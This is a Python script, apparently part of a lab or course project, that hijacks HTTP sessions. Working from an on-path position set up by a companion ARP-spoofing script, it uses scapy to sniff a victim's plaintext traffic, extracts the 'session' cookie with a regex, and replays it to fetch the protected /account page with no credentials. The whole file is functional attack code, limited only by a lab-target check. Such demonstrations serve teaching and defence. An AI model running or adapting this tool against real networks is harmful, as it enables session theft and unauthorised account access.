#!/usr/bin/env python3
"""
Phase 4 - HTTP Session Hijack (Design Report Section 4 / Section 3.5).

Requires the attacker to already be on-path (arp_spoof.py running) so the
victim's plaintext HTTP login is visible on this machine's interface. This
script sniffs for the Cookie / Set-Cookie header carrying the session
token, then issues its own GET /account request from the attacker machine
using only that token -- proving the server cannot tell the replay from the
real client (no password involved at any point).

Run on the ATTACKER VM (192.168.56.30), after the real client has logged
in through a browser/curl pointed at the server:
    sudo python3 attacker/cookie_replay.py --client 192.168.56.10 \
        --server 192.168.56.20 --port 80 --iface eth1
"""

import argparse
import re

import requests
from scapy.all import IP, TCP, sniff

from common import require_lab_targets, setup_logging

log = setup_logging("cookie_replay")

# Section 3.5: "Cookie: session=abc123xyz" (request) and
# "Set-Cookie: session=abc123xyz; Path=/" (response) -- either is enough.
COOKIE_RE = re.compile(rb"(?:Cookie|Set-Cookie):\s*session=([^\r\n;]+)")


def sniff_session_token(client_ip, server_ip, port, iface, capture_timeout):
    found = {}

    def on_packet(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer("Raw")):
            return
        if {pkt[IP].src, pkt[IP].dst} != {client_ip, server_ip}:
            return
        payload = bytes(pkt["Raw"].load)
        match = COOKIE_RE.search(payload)
        if match:
            found["token"] = match.group(1).decode()
            found["seen"] = True

    log.info(
        "Sniffing HTTP traffic between %s and %s:%d for the session cookie "
        "(log in as the client now if you haven't already)...",
        client_ip, server_ip, port,
    )
    sniff(
        iface=iface,
        filter=f"tcp and host {client_ip} and host {server_ip} and port {port}",
        prn=on_packet,
        timeout=capture_timeout,
        stop_filter=lambda p: found.get("seen", False),
    )
    return found.get("token")


def replay_cookie(server_ip, port, path, token):
    url = f"http://{server_ip}:{port}{path}" if port != 80 else f"http://{server_ip}{path}"
    log.info("Replaying stolen cookie 'session=%s' to GET %s (no credentials sent)", token, url)
    response = requests.get(url, cookies={"session": token}, timeout=5)
    return response


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--client", required=True)
    parser.add_argument("--server", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--path", default="/account")
    parser.add_argument("--iface", required=True)
    parser.add_argument("--capture-timeout", type=int, default=30)
    args = parser.parse_args()

    require_lab_targets(args.client, args.server)

    token = sniff_session_token(args.client, args.server, args.port, args.iface, args.capture_timeout)
    if not token:
        raise SystemExit(
            "[ERROR] No session cookie observed. Make sure arp_spoof.py is "
            "running and the client logged in over HTTP during the capture window."
        )
    log.info("Captured session token: %s", token)

    response = replay_cookie(args.server, args.port, args.path, token)
    log.info("RESULT: HTTP %d from %s", response.status_code, args.server)
    if response.status_code == 200:
        log.info("Hijack succeeded -- server returned the protected page with no credentials.")
    else:
        log.info("Server did not return the protected page (check whether the token is still valid).")
    print("\n--- response body ---")
    print(response.text)


if __name__ == "__main__":
    main()
